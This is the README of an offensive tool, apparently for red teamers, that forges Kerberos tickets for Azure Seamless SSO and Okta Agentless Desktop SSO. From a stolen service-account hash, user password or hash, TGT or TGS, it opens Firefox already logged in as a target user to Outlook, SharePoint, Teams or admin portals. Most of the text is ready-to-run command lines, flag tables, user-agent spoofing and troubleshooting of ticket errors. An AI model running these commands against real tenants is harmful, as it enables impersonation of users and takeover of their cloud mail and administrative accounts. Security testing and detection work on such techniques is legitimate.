# seamless-sso-browser

Forges Kerberos tickets for Azure Seamless SSO and Okta Agentless Desktop SSO, then drops you into a target user's browser session. Give it a hash, a password, a TGT -- whatever you've got. It gets the tickets sorted and launches Firefox already authenticated.

## Prerequisites

- Linux with GSSAPI libs (Kali works out of the box)
- Firefox (`sudo apt install firefox-esr`)
- Seamless SSO (Azure) or Agentless Desktop SSO (Okta) enabled on the target tenant

## Usage

Run directly:

```bash
uvx git+https://github.com/dejisec/seamless-sso-browser -h
```

Or clone and run:

```bash
git clone https://github.com/dejisec/seamless-sso-browser.git
cd seamless-sso-browser
uv sync
uv run seamless-sso-browser -h
```

## Examples

### You have the AZUREADSSOACC$ hash

The classic silver ticket path. No DC contact needed.

```bash
seamless-sso-browser \
  --domain domain.local \
  --user-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-1234 \
  --user jsmith \
  --adssoacc-ntlm <AZUREADSSOACC_NTLM_HASH>
```

Use `--adssoacc-aes` if the account only supports AES.

### You have the user's password or hash

Talks to the DC to get a TGT, then requests service tickets for both SSO SPNs.

```bash
seamless-sso-browser \
  --domain domain.local \
  --dc-ip 10.0.0.1 \
  --user jsmith \
  --password 'P@ssw0rd'
```

Also works with `--user-password-hash <LMHASH:NTHASH>` or `--user-aes-key <hex>`.

### You have a TGT

Maybe from Rubeus, maybe from a ccache on disk. Pass it in and the tool requests the SSO service tickets from the DC.

```bash
seamless-sso-browser \
  --domain domain.local \
  --dc-ip 10.0.0.1 \
  --tgt /path/to/tgt.ccache
```

Accepts ccache, kirbi, or base64.

### You have a TGS

Already got the service ticket? No DC needed.

```bash
seamless-sso-browser \
  --domain domain.local \
  --tgs /path/to/tgs.kirbi
```

Accepts ccache, kirbi, or base64.

### You have a ccache file

Skip everything, just point at it:

```bash
seamless-sso-browser \
  --domain domain.local \
  --ccache /path/to/combined.ccache
```

### The tenant uses Okta, not Azure

Same five paths, aimed at Okta's Agentless Desktop SSO (IWA) instead. Add `--idp okta` and your org subdomain with `--okta-org`. Okta authenticates against a single tenant SPN, `HTTP/<org>.kerberos.<base-domain>`, so you get one ticket and no merge step. The base domain comes from `--okta-domain`: `okta.com`, `oktapreview.com`, `okta-emea.com`, or `okta-gov.com`.

```bash
seamless-sso-browser \
  --domain domain.local \
  --idp okta --okta-org acme \
  --user-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-1234 \
  --user jsmith \
  --okta-svc-aes <OKTA_DSSO_SERVICE_ACCOUNT_AES_KEY>
```

Forgery is AES-only here -- Okta rejects RC4, so there's no NTLM flag for this path. The password, TGT, TGS, and ccache examples above all work the same once you add `--idp okta --okta-org`. For a non-default environment, set `--okta-domain` (`oktapreview`, `okta-emea`, `okta-gov`).

You can leave `--okta-org` out in `--tgs` and `--ccache` mode. The tool reads the Okta host out of the ticket instead, from the first credential that carries an `HTTP/<org>.kerberos.<base-domain>` service principal.

### Targeting something other than Outlook

Default opens Outlook. Use `--target` to pick a different app:

```bash
seamless-sso-browser \
  --domain domain.local \
  --ccache /path/to/combined.ccache \
  --target sharepoint --tenant contoso
```

Presets: `outlook` (default), `sharepoint` (needs `--tenant`), `teams`, `onedrive`, `admin`, `entra`, `azure`, `okta-dashboard` (needs `--idp okta` and `--okta-org`).

You can also pass a raw URL: `--target https://custom-app.contoso.com`.

### User-agent

The tool always spoofs Edge on Windows 11 by default, override with `--useragent "..."` if needed.

## All flags

### Authentication (pick one)

| Flag | Description |
|------|------------|
| `--adssoacc-ntlm` | AZUREADSSOACC$ NTLM hash (silver ticket, no DC) |
| `--adssoacc-aes` | AZUREADSSOACC$ AES key (silver ticket, no DC) |
| `--okta-svc-aes` | Okta DSSO service account AES key (silver ticket, AES-only, needs `--idp okta`) |
| `--password` | User's password (needs DC) |
| `--user-password-hash` | User's NTLM hash, `[LMHASH:]NTHASH` (needs DC) |
| `--user-aes-key` | User's AES key (needs DC) |
| `--tgt` | Pre-obtained TGT, file or base64 (needs DC) |
| `--tgs` | Pre-obtained TGS, file or base64 (no DC) |
| `--ccache` | Pre-forged ccache file (skips everything) |

### Identity and domain

| Flag | Description |
|------|------------|
| `--domain` | AD domain (always required) |
| `--user` | Target sAMAccountName |
| `--user-sid` | Full user SID (required for silver ticket forgery) |
| `--upn` | UPN for display only |
| `--dc-ip` | Domain controller address |

### Okta (Agentless Desktop SSO)

| Flag | Description |
|------|------------|
| `--idp` | Identity provider, `azure` (default) or `okta` |
| `--okta-org` | Okta org subdomain, e.g. `acme` (needs `--idp okta`; required except in `--tgs`/`--ccache` mode, where the host comes from the ticket) |
| `--okta-domain` | Okta environment: `okta` (default), `oktapreview`, `okta-emea`, `okta-gov` |
| `--okta-svc-aes` | Okta DSSO service account AES key (silver ticket, AES-only) |

### Target and browser

| Flag | Description |
|------|------------|
| `--target` | App preset or URL (default: `outlook`) |
| `--tenant` | M365 tenant name (for `--target sharepoint`) |
| `--useragent` | Custom user-agent (default: Edge on Windows 11) |
| `--firefox-path` | Path to Firefox binary |
| `--no-cleanup` | Keep temp files after exit |
| `--verbose` | Print ccache path, krb5.conf, and the Firefox command, plus the traceback after an error |

## Troubleshooting

Run with `--verbose --no-cleanup` first. That prints the ccache path, krb5.conf contents, and the exact Firefox command so you can poke at things manually.

If SPNEGO negotiation isn't happening, `--verbose` already has most of the tracing on. It sets `KRB5_TRACE=/dev/stderr` and `NSPR_LOG_MODULES=negotiateauth:5` for the Firefox child and leaves the child's stderr on your terminal, so both traces scroll past while Firefox runs. Without `--verbose`, Firefox's stderr goes to `/dev/null`.

`NSPR_LOG_FILE` is not one of them, so the SPNEGO log only ever reaches the terminal. Export all three yourself to put it in a file, or to relaunch Firefox by hand against a profile `--no-cleanup` kept:

```bash
export NSPR_LOG_MODULES=negotiateauth:5
export NSPR_LOG_FILE=/tmp/firefox_spnego.log
export KRB5_TRACE=/dev/stderr
```

A hand relaunch also needs the `KRB5CCNAME` and `KRB5_CONFIG` values `--verbose` printed before the launch.

Usual suspects: clock skew, Firefox not picking up the ccache (check `KRB5CCNAME`), or Conditional Access.

Clock skew comes back from the KDC as `KRB_AP_ERR_SKEW`, and the tool exits 5. The error line says the skew between this host and the DC is over 5 minutes; synchronize the clock and retry.

Conditional Access is not a Kerberos error, and this tool never sees it. The tickets are valid, SPNEGO succeeds, Firefox launches, and the block shows up in the browser, so the exit code is 0.

`KDC_ERR_S_PRINCIPAL_UNKNOWN` is another exit 5. It means the KDC has no record of the SSO service principal the tool asked for, so either SSO was never turned on for this tenant or org, or the name is wrong. On Azure, check that Seamless SSO is enabled on the tenant and that the `AZUREADSSOACC$` account still exists in the domain. On Okta, the error line names the SPN it asked for: check that Agentless Desktop SSO is enabled for the org, and that `--okta-org` and `--okta-domain` spell the host the way Okta does.

Two more exit 5 errors: `KDC_ERR_PREAUTH_FAILED` means the KDC rejected the password, hash, or AES key for this user, and `KDC_ERR_WRONG_REALM` means `--domain` is not the realm the ticket was issued in.

## Acknowledgments

Inspired by [SeamlessPass](https://github.com/Malcrove/SeamlessPass) by Malcrove, which does the Seamless SSO flow as a CLI tool and gives you OAuth tokens. This project takes the same idea but wires it into a browser session instead, so you land directly in Outlook, SharePoint, or whatever else the target has access to.
